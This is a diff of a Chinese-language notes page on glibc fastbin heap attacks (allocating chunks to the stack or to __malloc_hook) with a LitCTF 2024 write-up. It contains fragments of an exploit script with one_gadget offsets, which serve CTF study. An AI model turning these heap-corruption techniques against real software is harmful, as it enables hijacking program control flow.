@@ -1,7 +1,7 @@
 ---
 title: Fastbin Attack
 date: '2025-02-19 15:27:26'
-updated: '2025-04-12 11:27:10'
+updated: '2025-09-20 17:23:50'
 ---
 第一个进入 fastbin 的 chunk 的 fd 是空的
 
@@ -59,14 +59,14 @@ bk_nextsize: 0x00
 剩余详看 house 系列 House of spirits
 
 ## <font style="color:rgba(0, 0, 0, 0.87);">Alloc to Stack</font>
-核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。
+核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等
 
 ## Arbitrary Alloc
-Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。
+Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等
 
 使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。
 
-Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。
+Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值
 
 ## LitCTF 2024 heap2.23
 刚打通用的 exp 多此一举用的 doublefree 来改 fd...（尴尬...）后面才反应过来...
@@ -97,7 +97,7 @@ def edit(idx,content):
 
 ogg=[0x4525a,0xef9f4,0xf0897]
 
-create(1,144)
+create(1,0x90)
 create(2,0x68)
 create(3,0x68)
 delete(1)
@@ -129,7 +129,7 @@ link.interactive()
 ...
 ogg=[0x4525a,0xef9f4,0xf0897]
 
-create(1,144)
+create(1,0x90)
 create(2,0x68)
 create(3,0x68)
 delete(1)
